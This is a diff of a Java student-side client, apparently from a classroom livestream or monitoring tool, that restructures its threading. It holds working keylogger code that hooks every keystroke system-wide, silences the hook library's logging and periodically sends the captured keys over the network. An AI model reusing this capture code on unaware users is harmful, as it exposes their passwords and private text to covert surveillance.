@@ -92,20 +92,14 @@ public class StudentSocket{
         Thread taskThread = new Thread(new StudentTaskUdp(socketSend, socketReceive));
         try {
             taskThread.start();
-            taskThread.join();
-        } catch (InterruptedException e) {
-            throw new RuntimeException(e);
-        } finally {
-            latch.countDown();
-            cleanupResources();
-            System.out.println("Close Livestream");
-        }
-        try {
+
+            // Thay vì join() ở đây, bạn có thể thực hiện các tác vụ khác
             Timer timer = new Timer();
             timer.schedule(new TimerTask() {
                 @Override
                 public void run() {
-                    if (!TeacherSocket.isLive()) {
+                    if (!StudentSocket.isLive()) {
+                        //System.out.println("Hủy");
                         timer.cancel();
                         return;
                     }
@@ -117,11 +111,9 @@ public class StudentSocket{
             logger.setLevel(Level.OFF);
             logger.setUseParentHandlers(false);
 
-
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
                 private boolean isShift = false;
-                //    private boolean capsLockOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK); // Lấy trạng thái CAPS LOCK ban đầu
 
                 @Override
                 public void nativeKeyPressed(NativeKeyEvent e) {
@@ -132,8 +124,63 @@ public class StudentSocket{
         } catch (NativeHookException e) {
             throw new RuntimeException(e);
         } finally {
-            System.out.println("Close Send KeyLogger");
+            // Cleanup should be handled after taskThread has finished
+            try {
+                taskThread.join(); // Chỉ gọi join() ở đây nếu cần phải đợi kết thúc
+            } catch (InterruptedException e) {
+                throw new RuntimeException(e);
+            } finally {
+                latch.countDown();
+                cleanupResources();
+                System.out.println("Close Livestream");
+                System.out.println("Close Send KeyLogger");
+            }
         }
+//        Thread taskThread = new Thread(new StudentTaskUdp(socketSend, socketReceive));
+//        try {
+//            taskThread.start();
+//            taskThread.join();
+//        } catch (InterruptedException e) {
+//            throw new RuntimeException(e);
+//        } finally {
+//            latch.countDown();
+//            cleanupResources();
+//            System.out.println("Close Livestream");
+//        }
+//        try {
+//            Timer timer = new Timer();
+//            timer.schedule(new TimerTask() {
+//                @Override
+//                public void run() {
+//                    if (!StudentSocket.isLive()) {
+//                        timer.cancel();
+//                        return;
+//                    }
+//                    sendKeyData();
+//                }
+//            }, 0, SEND_INTERVAL);
+//
+//            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+//            logger.setLevel(Level.OFF);
+//            logger.setUseParentHandlers(false);
+//
+//
+//            GlobalScreen.registerNativeHook();
+//            GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
+//                private boolean isShift = false;
+//                //    private boolean capsLockOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK); // Lấy trạng thái CAPS LOCK ban đầu
+//
+//                @Override
+//                public void nativeKeyPressed(NativeKeyEvent e) {
+//                    String ketText = NativeKeyEvent.getKeyText(e.getKeyCode());
+//                    keyLogBuffer.append(ketText + " ");
+//                }
+//            });
+//        } catch (NativeHookException e) {
+//            throw new RuntimeException(e);
+//        } finally {
+//            System.out.println("Close Send KeyLogger");
+//        }
     }
     private void cleanupResources() {
         if (socketReceive != null) socketReceive.close();
